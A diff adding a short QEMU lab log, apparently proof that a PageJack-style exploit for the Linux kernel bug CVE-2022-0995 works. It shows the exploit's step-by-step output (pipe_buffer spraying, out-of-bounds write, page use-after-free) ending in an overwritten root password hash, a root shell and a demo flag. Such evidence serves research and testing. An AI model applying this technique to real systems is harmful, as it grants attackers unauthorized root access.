@@ -1,0 +1,24 @@
+PageJack QEMU evidence / 2026-09-13
+
+~ $ /exp/exp
+[*] CVE-2022-0995 by Lotus
+[*] spray pipe_buffer...
+[+] edit the pipe_buffer size to 0x60
+[*] allocating pipe pages...
+[*] Create 2 holes in pipe_buffer...
+[+] Trigger OOB
+[*] finding...
+found pipe coincide at idx:28 and 27
+[*] uaf one of the pipe_buffer->page
+[*] Spray pwd file struct...
+[*] Edit pwd file->f_mode...
+Setting root password to "Lotus"...
+[*] finally: edit the pwd file
+Write Success:109!
+[*] Now the password is:
+root:$1$Lotus$TzwLEwMAk3C7fXk4o9atu0:0:0:test:/root:/bin/sh
+
+~ $ echo Lotus | su root -c 'id; strings /flag | head -n 1'
+Password:
+uid=0(root) gid=0(root) groups=0(root)
+flag{PageJack_Demo_Flag_ZJU_RKP}
